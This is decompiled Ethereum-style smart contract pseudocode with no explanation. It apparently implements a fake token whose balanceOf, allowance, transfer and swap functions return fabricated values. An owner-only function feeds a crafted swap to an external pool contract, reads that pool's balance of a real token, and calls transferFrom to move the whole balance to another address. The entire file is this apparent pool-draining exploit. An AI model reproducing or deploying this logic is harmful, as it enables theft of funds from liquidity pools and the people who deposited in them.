contract main {




// =====================  Runtime code  =====================


address stor0;

function _fallback() {
  stop
}

function balanceOf(address arg1) {
    require calldata.size - 4 >= 32
    require arg1 == arg1
    return 10000000000000 * 10^18
}

function approve(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return 1
}

function transfer(address arg1, uint256 arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return 1
}

function allowance(address arg1, address arg2) {
    require calldata.size - 4 >= 64
    require arg1 == arg1
    require arg2 == arg2
    return -1
}

function transferFrom(address arg1, address arg2, uint256 arg3) {
    require calldata.size - 4 >= 96
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    return 1
}

function swapExactAmountIn(address arg1, uint256 arg2, address arg3, uint256 arg4, uint256 arg5) {
    require calldata.size - 4 >= 160
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg4 == arg4
    require arg5 == arg5
    return 0, 10^18
}

function exchange_underlying(int128 arg1, int128 arg2, uint256 arg3, uint256 arg4) {
    require calldata.size - 4 >= 128
    require arg1 == ('signextend', 15, ('param', 'arg1'))
    require arg2 == ('signextend', 15, ('param', 'arg2'))
    require arg3 == arg3
    require arg4 == arg4
}

function swap(uint256 arg1, uint256 arg2, address arg3, bytes arg4) {
    require calldata.size - 4 >= 128
    require arg1 == arg1
    require arg2 == arg2
    require arg3 == arg3
    require arg4 <= test266151307()
    require arg4 + 35 < calldata.size
    require arg4.length <= test266151307()
    require ceil32(arg4.length) + 128 <= test266151307() and ceil32(arg4.length) + 128 >= 96
    require arg4 + arg4.length + 36 <= calldata.size
}

function swapExactTokensForTokens(uint256 arg1, uint256 arg2, address[] arg3, address arg4, uint256 arg5) {
    require calldata.size - 4 >= 160
    require arg1 == arg1
    require arg2 == arg2
    require arg3 <= test266151307()
    require arg3 + 35 < calldata.size
    require arg3.length <= test266151307()
    require arg3 + (32 * arg3.length) + 36 <= calldata.size
    require arg4 == arg4
    require arg5 == arg5
    return 32, 2, 25917159259802132000, 2248849204899372703187
}

function sub_814fe7b9(?) payable {
    if stor0 != msg.sender:
        revert with 0, 'begone'
    mem[452 len 352] = 0, 25917159259802132000, 96, 224, 3, 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7, 0xc38f41a296a4493ff429f1238e030924a1542e50, 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7, 2, 0, this.address, 0, address(this.address), mem[464 len 16]
    call 0x96b5c47ab908fd60f7c3ea2253264b84e6f45509.mem[452 len 4] with:
         gas gas_remaining wei
        args mem[456 len 320]
    require ext_code.size(0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7)
    staticcall 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7.0x70a08231 with:
            gas gas_remaining wei
           args 0x96b5c47ab908fd60f7c3ea2253264b84e6f45509
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == ext_call.return_data[0]
    require ext_code.size(0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7)
    call 0xb31f66aa3c1e785363f0875a1b74e27b85fd66c7.0x23b872dd with:
         gas gas_remaining wei
        args 0x96b5c47ab908fd60f7c3ea2253264b84e6f45509, 0x7ee6f9d1f5e3dd90a84bd042d1ac35df6c80b500, ext_call.return_data[0]
    if not ext_call.success:
        revert with ext_call.return_data[0 len return_data.size]
    require return_data.size >= 32
    require ext_call.return_data[0] == bool(ext_call.return_data[0])
}



}
